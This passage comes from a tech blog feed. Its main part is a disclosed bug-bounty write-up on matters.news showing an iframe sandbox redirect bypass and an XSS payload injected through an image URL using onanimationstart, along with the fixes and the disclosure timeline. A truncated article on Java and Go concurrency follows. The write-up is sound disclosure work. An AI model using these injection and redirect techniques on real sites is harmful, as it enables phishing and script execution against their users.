punctuation\">${</span>process<span class=\"token punctuation\">.</span>env<span class=\"token punctuation\">.</span><span class=\"token constant\">NEXT_PUBLIC_ASSET_DOMAIN</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><br>    <span class=\"token operator\">:</span> <span class=\"token string\">''</span><br>  <span class=\"token keyword\">const</span> isOutsideLink <span class=\"token operator\">=</span> url<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span>assetDomain<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><br>  <span class=\"token keyword\">const</span> isGIF <span class=\"token operator\">=</span> <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">gif</span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">i</span></span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><br><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>assetDomain <span class=\"token operator\">||</span> isOutsideLink <span class=\"token operator\">||</span> isGIF<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">return</span> url<br>  <span class=\"token punctuation\">}</span><br><br>  <span class=\"token keyword\">const</span> key <span class=\"token operator\">=</span> url<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>assetDomain<span class=\"token punctuation\">,</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">const</span> extedUrl <span class=\"token operator\">=</span> <span class=\"token function\">changeExt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> key<span class=\"token punctuation\">,</span> ext <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">const</span> prefix <span class=\"token operator\">=</span> size <span class=\"token operator\">?</span> <span class=\"token string\">'/'</span> <span class=\"token operator\">+</span> <span class=\"token constant\">PROCESSED_PREFIX</span> <span class=\"token operator\">+</span> <span class=\"token string\">'/'</span> <span class=\"token operator\">+</span> size <span class=\"token operator\">:</span> <span class=\"token string\">''</span><br><br>  <span class=\"token keyword\">return</span> assetDomain <span class=\"token operator\">+</span> prefix <span class=\"token operator\">+</span> extedUrl<br><span class=\"token punctuation\">}</span></code></pre>\n<p>只要 domain 是 assets 的 domain 並符合其他條件，就會經過一些字串處理之後回傳。</p>\n<p>看到這邊，就大致上了解整個文章的 render 過程了。</p>\n<p>會在 server side 用 js-xss 這套 library 進行過濾，在 client side 這邊則是用 dangerouslySetInnerHTML 來 render，其中會先對 img tag 做一些處理，把 img 改成用 picture + source 的方式針對不同解析度或是螢幕尺寸載入不同的圖片。</p>\n<p>以上就是這個網站 render 文章的整個過程，再繼續往下看之前你可以想一下，有沒有什麼地方有問題？</p>\n<p>== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==<br>\n== 防雷分隔 ==</p>\n<h2 id=\"%E7%AC%AC%E4%B8%80%E5%80%8B%E5%95%8F%E9%A1%8C%EF%BC%9A%E9%8C%AF%E8%AA%A4%E7%9A%84%E5%B1%AC%E6%80%A7%E9%81%8E%E6%BF%BE\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%80%E5%80%8B%E5%95%8F%E9%A1%8C%EF%BC%9A%E9%8C%AF%E8%AA%A4%E7%9A%84%E5%B1%AC%E6%80%A7%E9%81%8E%E6%BF%BE\">#</a> 第一個問題：錯誤的屬性過濾</h2>\n<p>你有發現這邊的過濾有問題嗎？</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> <span class=\"token constant\">CUSTOM_WHITE_LISTS</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  a<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span><span class=\"token punctuation\">(</span>xss<span class=\"token punctuation\">.</span>whiteList<span class=\"token punctuation\">.</span>a <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'class'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  figure<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  figcaption<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  source<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'src'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'type'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  iframe<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'src'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'frameborder'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'allowfullscreen'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sandbox'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>開放 iframe 應該是因為要讓使用者可以嵌入 YouTube 影片之類的東西，但問題是這個網站並沒有用 CSP 指定合法的 domain，因此這邊的 src 可以隨意亂填，我可以自己做一個網站然後用 iframe 嵌入。如果網頁內容設計得好，看起來就會是這個網站本身的一部分：</p>\n<p><img src=\"https://i.imgur.com/rivVdiC.png\" alt=\"\"></p>\n<p>以上只是隨便填的一個範例，主要是讓大家看個感覺，如果真的有心想攻擊的話可以弄得更精緻，內容更吸引人。</p>\n<p>如果只是這樣的話，攻擊能否成功取決與內容是否能夠取信於使用者。但其實可以做到的不只這樣，大家知道在 iframe 裡面是可以操控外面的網站嗎？</p>\n<p>cross origin 的 window 之間能存取的東西有限，唯一能夠改變的是 <code>location</code> 這個東西，意思就是我們可以在 iframe 裡面，把嵌入你的網站重新導向：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>  top<span class=\"token punctuation\">.</span>location <span class=\"token operator\">=</span> <span class=\"token string\">'https://google.com'</span><br></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>這樣做的話，我就可以把整個網站重新導向到任何地方，一個最簡單能想到的應用就是重新導向到釣魚網站。這樣的釣魚網站成功機率是比較高的，因為使用者可能根本沒有意識到他被重新導向到其他網站了。</p>\n<p>其實瀏覽器針對這樣的重新導向是有防禦的，上面的程式碼會出現錯誤：</p>\n<blockquote>\n<p>Unsafe attempt to initiate navigation for frame with origin '<a href=\"https://matters.news\">https://matters.news</a>' from frame with URL '<a href=\"https://53469602917d.ngrok.io/\">https://53469602917d.ngrok.io/</a>'. The frame attempting navigation is targeting its top-level window, but is neither same-origin with its target nor has it received a user gesture. See <a href=\"https://www.chromestatus.com/features/5851021045661696\">https://www.chromestatus.com/features/5851021045661696</a>.</p>\n</blockquote>\n<blockquote>\n<p>Uncaught DOMException: Failed to set the 'href' property on 'Location': The current window does not have permission to navigate the target frame to '<a href=\"https://google.com\">https://google.com</a>'</p>\n</blockquote>\n<p>因為不是 same origin，所以會阻止 iframe 對 top level window 做導向。</p>\n<p>但是呢！這個東西是可以繞過的，會運用到 sandbox 這個屬性。這個屬性其實就是在指定嵌入的 iframe 有什麼權限，所以只要改成：<code>&lt;iframe sandbox=&quot;allow-top-navigation allow-scripts allow-same-origin&quot; src=example.com&gt;&lt;/iframe&gt;</code>，就可以成功對 top level window 重新導向，把整個網站給導走。</p>\n<p>這個漏洞在 <a href=\"https://ruvlol.medium.com/1000-for-open-redirect-via-unknown-technique-675f5815e38a\">GitLab</a> 與 <a href=\"https://github.com/hackmdio/codimd/issues/1263\">codimd</a> 都有出現過。</p>\n<p>這邊的修正方式有幾個，第一個是可以先把 sandbox 這個屬性拿掉，讓這個屬性不能被使用。如果真的有地方需要用到的話，就需要檢查裡面的值，把比較危險的 <code>allow-top-navigation</code> 給拿掉。</p>\n<p>再來的話也可以限制 iframe src 的位置，可以在不同層面做掉，例如說在程式碼裡面自己過濾 src，只允許特定 domain，或者是用 <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-src\">CSP:frame-src</a> 讓瀏覽器把這些不符合的 domain 自己擋掉。</p>\n<h2 id=\"%E7%AC%AC%E4%BA%8C%E5%80%8B%E5%95%8F%E9%A1%8C%EF%BC%9A%E6%9C%AA%E9%81%8E%E6%BF%BE%E7%9A%84-html\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%BA%8C%E5%80%8B%E5%95%8F%E9%A1%8C%EF%BC%9A%E6%9C%AA%E9%81%8E%E6%BF%BE%E7%9A%84-html\">#</a> 第二個問題：未過濾的 HTML</h2>\n<p>第一個問題能造成最大的危險大概就是重新導向了（codimd 那一篇是說在 Safari 可以做出 XSS 啦，只是我做不出來 QQ），但是除了這個之外，還有一個更大的問題，那就是這邊：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">></span><br>  <span class=\"token operator\">&lt;</span>div<br>    className<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token function\">classNames</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> <span class=\"token string\">'u-content'</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> translating <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><br>    dangerouslySetInnerHTML<span class=\"token operator\">=</span><br>    onClick<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>captureClicks<span class=\"token punctuation\">}</span><br>    ref<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>contentContainer<span class=\"token punctuation\">}</span><br>  <span class=\"token operator\">/</span><span class=\"token operator\">></span><br><br>  <span class=\"token operator\">&lt;</span>style jsx<span class=\"token operator\">></span><span class=\"token punctuation\">{</span>styles<span class=\"token punctuation\">}</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>style<span class=\"token operator\">></span><br><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span><span class=\"token operator\">></span></code></pre>\n<p><code>article.content</code> 是經過 js-xss 過濾後的 HTML 字串，所以是安全的，但這邊經過了一個 <code>optimizeEmbed</code> 去做自訂的轉換，在過濾以後還去改變內容其實是一件比較危險的事，因為如果處理的過程有疏忽，就會造成 XSS 的漏洞。</p>\n<p>在轉換裡面有一段程式碼為：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>source</span><br>  <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>image/webp<span class=\"token punctuation\">\"</span></span><br>  <span class=\"token attr-name\">media</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>(min-width: 768px)<span class=\"token punctuation\">\"</span></span><br>  <span class=\"token attr-name\">srcSet</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>${toSizedImageURL({</span> <span class=\"token attr-name\"><span class=\"token namespace\">url:</span></span> <span class=\"token attr-name\">src,</span> <span class=\"token attr-name\"><span class=\"token namespace\">size:</span></span> <span class=\"token attr-name\">'1080w',</span> <span class=\"token attr-name\"><span class=\"token namespace\">ext:</span></span> <span class=\"token attr-name\">'webp'</span> <span class=\"token attr-name\">})}</span><br>  <span class=\"token special-attr\"><span class=\"token attr-name\">onerror</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\"><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>srcset<span class=\"token operator\">=</span><span class=\"token string\">'${src}'</span></span><span class=\"token punctuation\">\"</span></span></span><br><span class=\"token punctuation\">/></span></span></code></pre>\n<p>仔細看這段程式碼，如果 <code>${toSizedImageURL({ url: src, size: '1080w', ext: 'webp' })}</code> 或是 <code>src</code> 我們可以控制的話，就有機會能夠改變屬性的內容，或者是新增屬性上去。</p>\n<p>我原本想插入一個惡意的 src 讓 onerror 變成 <code>onerror=&quot;this.srcset='test';alert(1)&quot;</code> 之類的程式碼，但我後來發現 picture 底下的 source 的 onerror 事件好像是無效的，就算 srcset 有錯也不會觸發，所以是沒用的。</p>\n<p>因此我就把焦點轉向 srcSet 以及插入新的屬性，這邊可以用 <code>onanimationstart</code> 這個屬性，在 animation 開始時會觸發的一個事件，而 animation 的名字可以去 CSS 裡面找，很幸運地找到了一個 keyframe 叫做<code>spinning</code>。</p>\n<p>因此如果 img src 為：<code>https://assets.matters.news/processed/1080w/embed/test style=animation-name:spinning onanimationstart=console.log(1337)</code></p>\n<p>結合後的程式碼就是：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>source</span><br>  <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>image/webp<span class=\"token punctuation\">\"</span></span><br>  <span class=\"token attr-name\">media</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>(min-width: 768px)<span class=\"token punctuation\">\"</span></span>   <br>  <span class=\"token attr-name\">srcSet</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>https://assets.matters.news/processed/1080w/embed/test</span> <br>  <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token value css language-css\"><span class=\"token property\">animation-name</span><span class=\"token punctuation\">:</span>spinning</span></span></span> <br>  <span class=\"token attr-name\">onanimationstart</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>console.log(1337)</span><br>  <span class=\"token special-attr\"><span class=\"token attr-name\">onerror</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\"><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>srcset<span class=\"token operator\">=</span><span class=\"token string\">'${src}'</span></span><span class=\"token punctuation\">\"</span></span></span><br><span class=\"token punctuation\">/></span></span></code></pre>\n<p>如此一來，就製造了一個 XSS 的漏洞：</p>\n<p><img src=\"https://i.imgur.com/nyugLUH.png\" alt=\"\"><br>\n<img src=\"https://i.imgur.com/iYLI0ku.png\" alt=\"\"></p>\n<p>修補方式也有幾個：</p>\n<ol>\n<li>新增 CSP header 阻止 inline script 的執行（這比較難做到，因為可能會跟現有東西牴觸，需要較多時間處理）</li>\n<li>過濾傳進來的 img url（如果過濾不好一樣有風險）</li>\n<li>先改變 HTML，才去呼叫 js-xss 幫你濾掉不該存在的屬性</li>\n</ol>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h2>\n<p>我們找到了兩個漏洞：</p>\n<ol>\n<li>透過 <code>&lt;iframe&gt;</code> 把使用者導到任意位置</li>\n<li>透過 <code>&lt;source&gt;</code> 執行文章頁面的 XSS 攻擊</li>\n</ol>\n<p>那實際上到底可以做到什麼樣的攻擊呢？</p>\n<p>可以先用第二個漏洞發表一篇有 XSS 攻擊的文章，再寫一個機器人去所有文章底下留言，利用 <code>&lt;iframe&gt;</code> 把使用者導到具有 XSS 的文章。如此一來，只要使用者點擊任何一篇文章都會被攻擊到。</p>\n<p>不過網站本身其他地方的防禦做得不錯，儘管有 XSS 但 Cookie 是 HttpOnly 的所以偷不走，修改密碼是用寄信的所以也沒辦法修改密碼，似乎沒辦法做到真的太嚴重的事情。</p>\n<p>許多過濾 XSS 的 library 本身是安全的（雖然有些時候其實還是會被發現<a href=\"https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss\">漏洞</a>），但使用 library 的人可能忽略了一些設定或者是額外做了一些事情，導致最後產生出來的 HTML 依然是不安全的。</p>\n<p>在處理與使用者輸入相關的地方時，應該對於每一個環節都重新檢視一遍，看看是否有疏忽的地方。</p>\n<p>CSP 的 header 也建議設定一下，至少在真的被 XSS 時還有最後一道防線擋住。雖然說 CSP 有些規則也可以被繞過，但至少比什麼都沒有好。</p>\n<p>Matters 有自己的 <a href=\"https://github.com/thematters/developer-resource/blob/master/SECURITY.md\">Bug Bounty Program</a>，只要找到能證明危害的漏洞都有獎金可以拿，這篇找到的 XSS 漏洞被歸類在 High，價值 150 元美金。他們團隊相信開源能惠及技術人員，也能讓網站更安全，因此希望大家知道這個計畫的存在。</p>\n<p>最後，感謝 Matters 團隊快速的回覆以及處理，也感謝 Cymetrics 的同事們。</p>\n<p>時間軸：</p>\n<ul>\n<li>2021–05–07 回報漏洞</li>\n<li>2021–05–12 收到 Matters 團隊確認信，正在修補漏洞</li>\n<li>2021–05–12 詢問修補完是否能發表文章，獲得許可</li>\n<li>2021–05–13 修復完成</li>\n</ul>\n",
      "date_published": "2021-05-15T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable-zh/",
      "url": "https://tech-blog.cymetrics.io/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable-zh/",
      "title": "比較 Java 和 Golang 在撰寫併發時處理共享變數的差異",
      "content_html": "<!-- summary -->\n<p>在寫 concurrency 程式時，通常會用 lock、synchronized 等機制保護存取共享資源的程式片段，確保一次只有一個 thread 可以使用這些共享資源。</p>\n<p>但若是共享資源不是一個程式片段而僅僅只是一個變數，使用 lock、synchronized 等機制就會顯得太笨重，甚至拖慢效能。</p>\n<!-- summary -->\n<p>以下面的 Golang 程式來說：</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">BenchmarkLocke</span><span class=\"token punctuation\">(</span>b <span class=\"token operator\">*</span>testing<span class=\"token punctuation\">.</span>B<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token keyword\">for</span> n <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> n <span class=\"token operator\">&lt;</span> b<span class=\"token punctuation\">.</span>N<span class=\"token punctuation\">;</span> n<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\ta <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><br>\t\t<span class=\"token keyword\">var</span> l sync<span class=\"token punctuation\">.</span>Mutex<br>\t\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10000</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t\tl<span class=\"token punctuation\">.</span><span class=\"token function\">Lock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t\t\ta<span class=\"token operator\">++</span><br>\t\t\tl<span class=\"token punctuation\">.</span><span class=\"token function\">Unlock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t<span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>profiling 這段程式以後會發現 CPU 時間幾乎都花在 Lock 上面，下為 profiling 結果：</p>\n<p><img src=\"/img/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable/lock-profiling.png\" alt=\"\"></p>\n<p>為了提升效能，保護單一變數在多個 thread 共用會用 lock-free 等手法。  而在撰寫 concurrency code 處理共享變數問題時，有三件事要注意：原子性 (atomicity)、可見性 (visibility) 以及有序性 (ordering)。</p>\n<p>本文就這三個議題，分別探討 Java 和 Golang 提供那些機制來處理，在此之前，我們先介紹一下這三個議題：</p>\n<h2 id=\"%E5%8E%9F%E5%AD%90%E6%80%A7\"><a class=\"direct-link\" href=\"#%E5%8E%9F%E5%AD%90%E6%80%A7\">#</a> 原子性</h2>\n<p>共用變數的操作需確保不會被中斷。一行程式碼可能由多個 cpu 指令組成，例如說 i++，就是由<strong>從變數取值</strong>，<strong>值加一</strong>，<strong>賦值回變數</strong>三個 cpu 指令。若是兩個 thread 同時執行 i++ 時，cpu 指令執行順序可能是這樣交錯執行：</p>\n<pre><code>thread1 讀值 100  \nthread2 讀值 100  \nthread1 加一 101  \nthread2 加一 101  \nthread1 賦值 101  \nthread2 賦值 101\n</code></pre>\n<p>因此會得到一個錯誤的結果，i=101。</p>\n<p>一個簡單的 java 範例如下</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Atomic</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">int</span> times <span class=\"token operator\">=</span> <span class=\"token number\">100000</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token class-name\">ExecutorService</span> executorService <span class=\"token operator\">=</span> <span class=\"token class-name\">Executors</span><span class=\"token punctuation\">.</span><span class=\"token function\">newFixedThreadPool</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">Counter</span> counter <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Counter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>times<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            executorService<span class=\"token punctuation\">.</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token punctuation\">{</span><br>                counter<span class=\"token punctuation\">.</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">.</span><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">20000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        executorService<span class=\"token punctuation\">.</span><span class=\"token function\">shutdown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>counter<span class=\"token punctuation\">.</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token keyword\">static</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Counter</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>第 16 行預期應該顯示 100000，但實際執行往往少於 100000。這就是因為共享變數的存取沒有保持一致性導致的。</p>\n<h2 id=\"%E5%8F%AF%E8%A6%8B%E6%80%A7\"><a class=\"direct-link\" href=\"#%E5%8F%AF%E8%A6%8B%E6%80%A7\">#</a> 可見性</h2>\n<p>在多核環境，每個 CPU 都會有專屬自己的 cache，原本的用意是用來減少直接跟 memory 溝通的次數以提升效能。下圖即為一個簡單的 cpu架構示意圖。</p>\n<p><img src=\"/img/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable/cpu-architecture.png\" alt=\"\"></p>\n<p>這此架構下，同一個變數可能存在多個 cpu 快取中，若是 cpu1 更新了變數而 cpu2 毫無所知的話，cpu2 上的 thread 就會一直使用舊的值。<br>\n下面是一段 java 範例：</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token class-name\">Flag</span> flag <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token class-name\">Thread</span> t1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>bool<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token comment\">// do nothing</span><br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    t1<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">Thread</span> t2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>        flag<span class=\"token punctuation\">.</span>bool <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    t2<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    t1<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Unreachable\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">static</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Flag</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">boolean</span> bool <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>即使 thread 2 已經將 flag 更新為 false，但 thread 1 仍有一定機率會一直卡在 for loop 無法逃脫，因為 thread 1 沒看到 thread 2 對 flag 的更新。</p>\n<h2 id=\"%E6%9C%89%E5%BA%8F%E6%80%A7\"><a class=\"direct-link\" href=\"#%E6%9C%89%E5%BA%8F%E6%80%A7\">#</a> 有序性</h2>\n<p>編譯器在把程式碼轉成 cpu 指令的時候有時會因為效能因素重排指令，這會導致實際 cpu 執行指令的順序和你想像的不太一樣。例如下面三行 code：</p>\n<pre class=\"language-text\"><code class=\"language-text\">a = 1  <br>b = 2  <br>c = a + b</code></pre>\n<p>第三行相依前兩行 code，因此 compile 只會保證前兩行在第三行前執行，亦即m是實際上執行順序可能會是</p>\n<pre class=\"language-text\"><code class=\"language-text\">b = 2  <br>a = 1  <br>c = a + b</code></pre>\n<p>這在 signle thread 是沒問題的，但在 multi thread 情況下亂序可能會造成你無法理解的 bug。以下是一個簡單的 Java code 範例：</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">private</span> <span class=\"token 